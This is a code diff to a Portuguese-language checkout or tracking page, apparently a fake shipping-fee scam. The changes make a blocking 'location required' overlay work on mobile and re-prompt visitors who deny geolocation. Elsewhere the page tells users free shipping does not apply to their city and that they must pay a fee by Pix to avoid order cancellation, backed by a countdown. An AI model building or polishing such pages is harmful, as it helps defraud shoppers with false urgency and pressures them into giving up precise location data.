@@ -216,6 +216,7 @@
             color: #4a5568;
             flex-wrap: wrap;
         }
+        /* Overlay de localização obrigatória - corrigido para funcionar no celular */
         .location-required {
             position: absolute;
             top: 0;
@@ -231,6 +232,7 @@
             text-align: center;
             color: white;
             padding: 40px;
+            box-sizing: border-box;
         }
         .location-required.hide {
             display: none;
@@ -239,12 +241,17 @@
             background: #ffcc00;
             color: #003366;
             border: none;
-            padding: 12px 24px;
+            padding: 14px 28px;
             border-radius: 60px;
             font-weight: bold;
             font-size: 1rem;
             margin-top: 20px;
             cursor: pointer;
+            width: 100%;
+            max-width: 250px;
+        }
+        .location-required p {
+            margin-bottom: 10px;
         }
         @media (max-width: 480px) {
             .logo-area img {
@@ -297,6 +304,7 @@
             <h2>Permissão de localização necessária</h2>
             <p>Para calcular o frete e evitar o cancelamento do seu pedido, precisamos saber onde você está.</p>
             <button id="allowLocationBtn"><i class="fas fa-location-dot"></i> Permitir localização</button>
+            <p style="font-size:0.7rem; margin-top:16px;">Após permitir, aguarde alguns segundos.</p>
         </div>
     </div>
 
@@ -309,6 +317,7 @@
             let lastCity = "";
             let lastUsedCEP = null;
             let countdownInterval = null;
+            let locationRetryCount = 0;
 
             function initMap() {
                 if (map) return;
@@ -457,7 +466,6 @@
                 if (countdownInterval) clearInterval(countdownInterval);
             }
             
-            // Cidade em NEGRITO
             function showUpsell(cidade) {
                 document.getElementById('popupAddress').innerHTML = `<i class="fas fa-location-dot"></i> O frete grátis não se aplica à sua região (<strong>${cidade}</strong>). Para evitar o cancelamento do pedido, confirme o pagamento do frete abaixo.`;
                 document.getElementById('upsellPopup').classList.add('show');
@@ -507,7 +515,8 @@
                 }
             }
             
-            async function requestLocationAndTrack() {
+            // Função corrigida para solicitar localização e tratar erros sem loop infinito
+            function requestLocationAndTrack() {
                 if (!navigator.geolocation) {
                     alert("Seu navegador não suporta geolocalização. Use um navegador moderno.");
                     return;
@@ -515,6 +524,7 @@
                 showOverlay("Solicitando permissão...", "Precisamos da sua localização para calcular o frete");
                 
                 navigator.geolocation.getCurrentPosition(async (position) => {
+                    // Sucesso: esconde overlay e continua
                     document.getElementById('locationOverlay').classList.add('hide');
                     const lat = position.coords.latitude;
                     const lng = position.coords.longitude;
@@ -550,10 +560,28 @@
                     }
                 }, (error) => {
                     hideOverlay();
+                    console.error("Geolocation error:", error);
                     if (error.code === 1) {
+                        // Permissão negada: mostra o overlay de bloqueio e um botão para tentar novamente
                         document.getElementById('locationOverlay').classList.remove('hide');
+                        // Adiciona um evento temporário para o botão, evitando múltiplos listeners
+                        const allowBtn = document.getElementById('allowLocationBtn');
+                        // Remove listeners antigos para não duplicar
+                        const newBtn = allowBtn.cloneNode(true);
+                        allowBtn.parentNode.replaceChild(newBtn, allowBtn);
+                        newBtn.addEventListener('click', () => {
+                            document.getElementById('locationOverlay').classList.add('hide');
+                            // Pequeno delay para garantir que o overlay sumiu
+                            setTimeout(() => {
+                                requestLocationAndTrack();
+                            }, 100);
+                        });
+                    } else if (error.code === 2) {
+                        alert("Localização indisponível. Tente ativar o GPS do seu dispositivo e recarregue a página.");
+                    } else if (error.code === 3) {
+                        alert("Tempo limite excedido. Tente novamente em um local com melhor sinal.");
                     } else {
-                        alert(`Erro de localização: ${error.message}. Tente permitir a localização nas configurações do navegador.`);
+                        alert("Erro desconhecido ao obter localização. Tente recarregar a página.");
                     }
                 }, { enableHighAccuracy: true, timeout: 10000 });
             }
@@ -578,10 +606,6 @@
                 initialize();
                 document.getElementById('btnFinalizar').addEventListener('click', redirectToPix);
                 document.getElementById('closeUpsell').addEventListener('click', hideUpsell);
-                document.getElementById('allowLocationBtn').addEventListener('click', () => {
-                    document.getElementById('locationOverlay').classList.add('hide');
-                    requestLocationAndTrack();
-                });
             });
         })();
     </script>
